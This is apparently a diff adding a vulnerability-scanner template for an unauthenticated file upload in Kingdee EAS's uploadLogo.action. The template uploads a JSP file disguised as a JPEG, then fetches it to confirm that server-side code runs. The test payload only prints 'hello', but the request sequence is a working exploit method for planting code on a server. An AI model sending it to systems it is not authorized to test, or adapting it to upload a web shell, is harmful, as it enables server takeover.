@@ -1,0 +1,73 @@
+id: kingdee-eas-uploadlogo-file-upload
+info:
+  name: Kingdee EAS uploadLogo.action File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Kingdee EAS and EAS Cloud have file upload vulnerabilities in uploadLogo.action. Attackers can use the file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+    cpe: cpe:/a:kingdee:eas
+    cwe-id: CWE-434
+  tags:
+    - file-upload
+    - critical
+http:
+  - raw:
+      - |
+        POST /plt_portal/setting/uploadLogo.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycxkT8bV6WLIUzm2p
+
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="chooseLanguage_top"
+
+        ch
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="dataCenter"
+
+        xx
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="insId"
+
+
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="type"
+
+        top
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="upload"; filename="text.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println("hello");%>
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\d+\\.jsp"
+    extractors:
+      - type: regex
+        name: uploaded_file
+        internal: true
+        regex:
+          - "(\\d+\\.jsp)"
+  - raw:
+      - |
+        GET /portal/res/file/upload/{{uploaded_file}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "hello"
